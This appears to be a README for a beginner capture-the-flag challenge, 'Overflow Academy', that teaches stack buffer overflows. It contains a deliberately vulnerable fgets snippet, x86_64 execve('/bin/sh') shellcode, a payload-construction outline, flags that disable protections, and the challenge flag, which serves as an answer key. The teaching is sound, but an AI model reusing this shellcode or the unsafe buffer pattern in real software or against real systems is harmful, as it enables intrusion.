# Overflow Academy

A beginner-friendly binary exploitation challenge focusing on stack-based buffer security.

---

## Challenge Info

| Field | Value |
|-------|-------|
| **Name** | Overflow Academy |
| **Category** | Binary Exploitation |
| **Difficulty** | Easy |
| **Flag** | `DSCCTF{0V3RFL0W_4C4D3MY_M4ST3R_2026}` |
| **Author** | ShadowPB |
| **Port** | 9001 |

---

## Challenge Description

üí• Welcome to binary exploitation fundamentals!

This challenge teaches the basics of buffer overflows and memory exploitation. The binary has all protections disabled to make it beginner-friendly:

- No stack canaries
- No ASLR (addresses are leaked)
- Executable stack
- No PIE

Your goal is to overflow the buffer and redirect execution to your payload to spawn a shell and read the flag.

---

## Files

- `overflow_academy.c` - Vulnerable source code
- `overflow_academy` - Compiled vulnerable binary
- `Makefile` - Build configuration with disabled protections
- `solve.py` - Complete exploitation script
- `start.sh` - Service launcher for remote deployment
- `flag.txt` - Target flag
- `Dockerfile` - Container setup
- `docker-compose.yml` - Easy deployment

---

## Quick Start

### Local Testing
```bash
# Compile with vulnerabilities
make

# Run the binary
./overflow_academy

# Or use the exploit script
python3 solve.py
```

### Remote Connection
```bash
# Connect to challenge server
nc ctf.dscctf.com 9001

# Or with solve script
python3 solve.py remote
```

### Docker Deployment
```bash
# Build and run
docker-compose up -d

# Binary will be available on port 9001
nc localhost 9001
```

---

## Vulnerability Analysis

### Buffer Overflow
```c
char buffer[100];  // 100-byte buffer
fgets(buffer, 150, stdin);  // Can read 150 bytes - OVERFLOW!
```

### Stack Layout
```
[buffer - 100 bytes][saved RBP - 8 bytes][return address - 8 bytes]
```

### Exploitation Strategy
1. **Fill buffer**: 100 bytes of payload/padding
2. **Overwrite saved RBP**: 8 bytes
3. **Control return address**: Point to our payload

---

## Solution Approach

### 1. Information Gathering
- Binary leaks buffer address: `Buffer address: 0x7fffffffe000`
- Calculate offset to return address: 108 bytes

### 2. Payload Development
```assembly
; /bin/sh payload (x86_64)
xor rax, rax
push rax
push 0x68732f2f6e69622f  ; "/bin/sh"
mov rdi, rsp
xor rsi, rsi
xor rdx, rdx
mov rax, 59              ; sys_execve
syscall
```

### 3. Payload Construction
```python
payload = code + padding + return_address
payload = code + 'A' * (108 - len(code)) + p64(buffer_addr)
```

### 4. Exploitation
```bash
# Send payload
python3 solve.py

# Should spawn shell
$ cat flag.txt
DSCCTF{0V3RFL0W_4C4D3MY_M4ST3R_2026}
```

---

## Learning Objectives

- **Buffer Overflow Mechanics**: Understanding stack corruption
- **Payload Writing**: Assembly programming for exploitation
- **Memory Layout**: Stack structure and calling conventions
- **Address Calculation**: Computing offsets and padding
- **Exploitation Techniques**: Return address hijacking

---

## Security Mitigations (Disabled)

| Protection | Status | Impact |
|------------|--------|--------|
| Stack Canaries | ‚ùå Disabled | No stack corruption detection |
| ASLR | ‚ùå Disabled | Predictable memory layout |
| NX Bit | ‚ùå Disabled | Executable stack allowed |
| PIE | ‚ùå Disabled | Fixed binary addresses |
| RELRO | ‚ùå Disabled | No GOT protection |

---

## Compilation Flags

```makefile
CFLAGS = -fno-stack-protector -z execstack -no-pie -g
```

- `-fno-stack-protector`: Disable canaries
- `-z execstack`: Make stack executable
- `-no-pie`: Disable position independent executable
- `-g`: Include debug symbols

---

## Advanced Techniques

### Alternative Exploitation Methods
1. **ROP Chain**: Return-oriented programming
2. **ret2libc**: Return to library functions
3. **GOT Overwrite**: Global offset table hijacking
4. **Stack Pivoting**: Changing stack pointer

---

## Hints

1. The binary helpfully leaks the buffer address
2. Calculate the exact offset to the return address
3. Keep your payload under 100 bytes
4. Test locally before trying remote

This challenge provides a safe introduction to binary exploitation concepts in a controlled environment.